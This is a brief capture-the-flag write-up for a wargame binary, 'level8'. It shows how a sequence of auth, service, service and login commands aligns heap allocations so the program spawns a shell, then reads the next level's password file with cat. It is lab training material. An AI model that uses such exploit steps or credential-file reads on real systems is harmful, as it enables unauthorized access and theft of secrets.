this program is a loop simulating a auth system

Basically, we have this command:
'auth '
'reset'
'service'
'login'

the program prints in loop the following promp:

1. printf("%p, %p \n", auth, (const void *)service);

2. user types an input

3. enter in condition if the command is valid
    3.1 ...
    3.2 restart the loop

4. restart the loop

we can see in the login part
    if ( *((_DWORD *)auth + 8) )
        system("/bin/sh");

*((_DWORD *)auth + 8) is equal to auth[32]

so we start to play with the program

$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
login
password:    // basically this line is our loose when we don't go to system("/bin/sh") we go here
0x804a008, 0x804a018
auth
0x804a028, 0x804a018
service
0x804a028, 0x804a038

by luck we do something like
auth
service
service
login

and it works we understand after

the result is
0x804a008, 0x804a028
so at this point auth[32] is *service

we win

in the shell like always
cat /home/user/level9/.pass
